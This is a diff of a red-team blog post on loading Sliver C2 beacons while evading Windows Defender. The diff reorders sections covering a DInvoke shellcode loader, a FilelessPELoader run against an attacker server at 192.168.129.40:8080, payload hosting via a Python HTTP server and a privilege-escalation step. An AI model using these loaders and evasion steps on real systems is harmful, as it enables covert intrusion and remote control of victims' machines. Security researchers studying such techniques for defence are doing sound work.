@@ -148,6 +148,13 @@ C:\Tools\ThreatCheck\bin\Release> ThreatCheck.exe -f C:\Tools\s3rp3ntLoader.exe
 [+] No threat found!
 ```
 
+### DInvoke Execution
+Now with everything set lets try to get a beacon from our victim machine (`172.16.0.5`). We will first make use of our **DInvoke Loader**.
+
+![Sliver DInvoke Loader](/assets/images/maldev/sliver-execution.png)
+
+After executing our custom shellcode loader, we can see it has grabbed our beacon file from our Python server (`rev.bin`), loaded the shellcode in memory and connected to our server without alerting Windows Defender. You see that I get a couple of beacon connections, because I ran the executable a couple of times. 
+
 No threats have been found! Our first loader looks good to go.
 
 ## Method 2: FilelessPELoader (C++)
@@ -174,6 +181,23 @@ aes.py cipher.bin key.bin ESSENTIAL_THEATER.exe
 ```
 
 The generated files `cipher.bin` and `key.bin` can be passed to our loader as arguments. In the next section we will have a look at how we can make use of our loaders.
+
+### FilelessPELoader Execution
+Now we can also try running our modified **FilelessPELoader** executable.
+
+!!!info Note
+Don't forget to specify the IP and PORT as well as the encrypted payload and key files as arguments.
+!!!
+
+```console
+$ python3 aes.py beacon.exe
+$ python3 -m http.server 8080
+Serving HTTP on 0.0.0.0 port 8080 (http://0.0.0.0:8080/) ...
+
+PS C:\> .\FilelessPELoader.exe 192.168.129.40 8080 cipher.bin key.bin
+```
+
+![Sliver FilelessPELoader](/assets/images/maldev/sliver-FilelessPELoader.png)
 
 ## Method 3: Custom Encrypted Stager
 Sliver has built-in support for custom stagers making use of encryption and compression when serving stages. First we need to setup our profile, listener, and stage listener with the following command:
@@ -225,38 +249,6 @@ $CompressionAlgorithm = "deflate9"
 
 This script is a PowerShell loader that is hosted on our server, intented to be downloaded and executed once an attacker gains code execution. The script will load the stager into memory via reflection and performs the `DownloadAndExecute` operation that downloads our Sliver agent from our payload server and executes it.
 
-## Sliver in Action
-Moving to our attack machine, we run our Python HTTP server where our shellcode is located.
-
-```console
-$ cd /tmp && python3 -m http.server 8080
-Serving HTTP on 0.0.0.0 port 8080 (http://0.0.0.0:8080/) ...
-```
-
-### DInvoke Execution
-Now with everything set lets try to get a beacon from our victim machine (`172.16.0.5`). We will first make use of our **DInvoke Loader**.
-
-![Sliver DInvoke Loader](/assets/images/maldev/sliver-execution.png)
-
-After executing our custom shellcode loader, we can see it has grabbed our beacon file from our Python server (`rev.bin`), loaded the shellcode in memory and connected to our server without alerting Windows Defender. You see that I get a couple of beacon connections, because I ran the executable a couple of times. 
-
-### FilelessPELoader Execution
-Now we can also try running our modified **FilelessPELoader** executable.
-
-!!!info Note
-Don't forget to specify the IP and PORT as well as the encrypted payload and key files as arguments.
-!!!
-
-```console
-$ python3 aes.py beacon.exe
-$ python3 -m http.server 8080
-Serving HTTP on 0.0.0.0 port 8080 (http://0.0.0.0:8080/) ...
-
-PS C:\> .\FilelessPELoader.exe 192.168.129.40 8080 cipher.bin key.bin
-```
-
-![Sliver FilelessPELoader](/assets/images/maldev/sliver-FilelessPELoader.png)
-
 ### Encrypted Stager Execution
 Our PowerShell loader can be hosted on a webserver as a normal file. On the victim, the following command executes the download and staging of the agent which will result in an incoming session in sliver.
 
@@ -268,7 +260,7 @@ In a minute we should get a session in Sliver with Defender stopping us.
 
 ![Sliver Session](/assets/images/maldev/sliver-session.png)
 
-### Privilege Escalation
+## Privilege Escalation
 Since we now have an active beacon on our target, we can even go a step further and escalate privileges on the host.
 Use one of the beacons and run `sa-whoami` (installed via armory). This will run a `whoami /all` in a more safe way.
 
